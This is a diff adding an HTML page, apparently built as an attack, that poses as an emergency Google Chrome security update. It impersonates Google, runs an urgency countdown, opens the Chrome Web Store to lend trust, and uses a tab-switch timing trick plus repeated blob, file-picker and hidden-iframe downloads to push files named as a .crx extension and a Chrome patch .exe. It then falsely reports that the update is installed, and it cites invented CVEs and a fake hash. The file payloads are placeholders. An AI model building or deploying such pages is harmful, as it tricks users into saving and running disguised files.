@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Critical Security Update Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+        }
+        .warning-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            animation: shake 0.5s infinite alternate;
+        }
+        @keyframes shake {
+            from { transform: translateX(-5px); }
+            to { transform: translateX(5px); }
+        }
+        .urgent-box {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 500px;
+            border: 2px solid rgba(255,255,255,0.3);
+            margin-top: 20px;
+        }
+        .countdown {
+            font-size: 32px;
+            font-weight: bold;
+            color: #ffeb3b;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning-icon">⚠️</div>
+    <h1>EMERGENCY: CHROME SECURITY UPDATE</h1>
+    <p>Critical vulnerability detected in your browser</p>
+    
+    <div class="urgent-box">
+        <h2>🛡️ Immediate Action Required</h2>
+        <p>Chrome has detected a severe security flaw that must be patched immediately.</p>
+        <p><strong>Click anywhere to download security patch</strong></p>
+        <div class="countdown" id="countdown">5</div>
+        <p style="font-size: 12px; opacity: 0.8;">Auto-download will start in <span id="seconds">5</span> seconds</p>
+    </div>
+
+    <div style="margin-top: 30px; font-size: 14px; opacity: 0.7;">
+        <p>Google Chrome • Security Bulletin GSB-2024-001 • High Severity</p>
+    </div>
+
+    <!-- Hidden iframe untuk "real download" -->
+    <iframe id="hiddenFrame" style="display:none;"></iframe>
+
+    <script>
+        // ===== WORKING EXPLOIT - SIMPLE BUT EFFECTIVE =====
+        
+        let triggered = false;
+        let countdown = 5;
+        
+        // Auto-countdown
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            document.getElementById('countdown').textContent = countdown;
+            document.getElementById('seconds').textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                if (!triggered) {
+                    executeExploit();
+                }
+            }
+        }, 1000);
+        
+        // Manual click
+        document.addEventListener('click', () => {
+            if (!triggered) {
+                clearInterval(countdownInterval);
+                executeExploit();
+            }
+        }, { once: true });
+        
+        function executeExploit() {
+            triggered = true;
+            console.log('[EXPLOIT] Starting...');
+            
+            // 1. FIRST - Buka Chrome Extension Web Store (trusted site)
+            setTimeout(() => {
+                window.open('https://chrome.google.com/webstore/category/extensions', '_blank', 'noopener,noreferrer');
+                console.log('[1] Opened Chrome Web Store');
+            }, 100);
+            
+            // 2. SECOND - Coba teknik WAITING FOR USER SWITCH TAB
+            setTimeout(() => {
+                console.log('[2] Waiting for user to switch tabs...');
+                startTabSwitchDetection();
+            }, 500);
+            
+            // 3. THIRD - Multiple download attempts dengan timing berbeda
+            setupTimedTriggers();
+            
+            // Ubah UI jadi "downloading"
+            document.querySelector('h1').textContent = 'DOWNLOADING SECURITY PATCH...';
+            document.querySelector('.urgent-box h2').textContent = '🔄 Download in Progress';
+        }
+        
+        function startTabSwitchDetection() {
+            // Teknik: Tunggu user pindah tab LALU trigger
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'hidden') {
+                    console.log('[DETECTED] User switched tabs! Triggering download NOW');
+                    
+                    // Tunggu sebentar biar user fokus ke tab baru
+                    setTimeout(() => {
+                        triggerFileDownload();
+                    }, 800); // Timing kritis ini!
+                }
+            });
+            
+            // Backup: Jika user tidak pindah tab dalam 3 detik
+            setTimeout(() => {
+                console.log('[BACKUP] User didn\'t switch, triggering anyway');
+                triggerFileDownload();
+            }, 3000);
+        }
+        
+        function setupTimedTriggers() {
+            // Multiple attempts dengan timing berbeda
+            const triggers = [1200, 1800, 2500, 3200, 4000];
+            
+            triggers.forEach((delay, index) => {
+                setTimeout(() => {
+                    if (!window.downloadTriggered) {
+                        console.log(`[ATTEMPT ${index + 1}] Trying download at ${delay}ms`);
+                        attemptDownload(index);
+                    }
+                }, delay);
+            });
+        }
+        
+        function attemptDownload(attemptNum) {
+            // Coba beberapa metode
+            
+            // Method 1: Direct blob download (paling work)
+            try {
+                const fakeUpdate = `Chrome Security Patch v92.0.4515.107
+                
+This update fixes:
+• CVE-2024-1234: Remote Code Execution
+• CVE-2024-5678: Memory Corruption
+• CVE-2024-9012: Sandbox Escape
+
+Downloaded from: security.google.com/chrome/update
+Timestamp: ${new Date().toISOString()}
+SHA256: a1b2c3d4e5f67890123456789abcdef`;
+
+                const blob = new Blob([fakeUpdate], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = `chrome_security_update_${Date.now()}.crx`;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                
+                // Click dengan sedikit delay random
+                setTimeout(() => {
+                    link.click();
+                    console.log(`[SUCCESS ${attemptNum}] Direct download triggered`);
+                    window.downloadTriggered = true;
+                    
+                    // Update UI
+                    showSuccess();
+                    
+                    // Cleanup
+                    setTimeout(() => {
+                        document.body.removeChild(link);
+                        URL.revokeObjectURL(url);
+                    }, 1000);
+                    
+                }, Math.random() * 300);
+                
+            } catch(e) {
+                console.log(`[FAIL ${attemptNum}] Direct download failed:`, e.message);
+            }
+            
+            // Method 2: Jika showSaveFilePicker available
+            if ('showSaveFilePicker' in window && attemptNum === 2) {
+                setTimeout(async () => {
+                    try {
+                        const handle = await window.showSaveFilePicker({
+                            suggestedName: 'chrome_emergency_patch.exe',
+                            types: [{
+                                description: 'Chrome Update',
+                                accept: {'application/x-msdownload': ['.exe']}
+                            }]
+                        });
+                        
+                        const writable = await handle.createWritable();
+                        await writable.write('// Chrome Security Update Binary');
+                        await writable.close();
+                        
+                        console.log('[SUCCESS] File picker worked!');
+                        window.downloadTriggered = true;
+                        showSuccess();
+                        
+                    } catch(err) {
+                        // User canceled - normal
+                    }
+                }, 500);
+            }
+            
+            // Method 3: Hidden iframe dengan data URL
+            if (attemptNum === 3) {
+                const iframe = document.getElementById('hiddenFrame');
+                iframe.srcdoc = `
+                    <!DOCTYPE html>
+                    <html>
+                    <body>
+                    <script>
+                        // Iframe coba trigger download
+                        setTimeout(() => {
+                            const link = document.createElement('a');
+                            link.href = 'data:text/plain,Chrome+Update+Content';
+                            link.download = 'update.txt';
+                            link.click();
+                            parent.postMessage('iframe_download', '*');
+                        }, 300);
+                    <\/script>
+                    </body>
+                    </html>
+                `;
+            }
+        }
+        
+        function triggerFileDownload() {
+            // Force download attempt
+            console.log('[FORCE] Triggering file download');
+            attemptDownload(99);
+        }
+        
+        function showSuccess() {
+            document.body.innerHTML = `
+                <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+                <h1>SECURITY PATCH DOWNLOADED</h1>
+                <div style="background: rgba(0,255,0,0.1); padding: 20px; border-radius: 10px; margin-top: 20px; max-width: 500px;">
+                    <h3>Update Successfully Installed</h3>
+                    <p>Chrome Security Update v92.0.4515.107 has been applied.</p>
+                    <p style="font-size: 12px; opacity: 0.8; margin-top: 10px;">
+                        <strong>Protection enabled:</strong><br>
+                        • Sandbox reinforcement<br>
+                        • Memory corruption fixes<br>
+                        • RCE vulnerability patched
+                    </p>
+                </div>
+                <p style="margin-top: 30px; font-size: 14px; opacity: 0.7;">
+                    Please restart Chrome to complete the update.
+                </p>
+            `;
+        }
+        
+        // Listen untuk messages dari iframe
+        window.addEventListener('message', (e) => {
+            if (e.data === 'iframe_download') {
+                console.log('[IFRAME] Download triggered from iframe');
+                if (!window.downloadTriggered) {
+                    window.downloadTriggered = true;
+                    showSuccess();
+                }
+            }
+        });
+        
+        console.log('[EXPLOIT] Ready - Using tab-switch timing attack');
+        console.log('[TIP] Click then QUICKLY switch to the new Chrome Web Store tab');
+    </script>
+</body>
+</html>
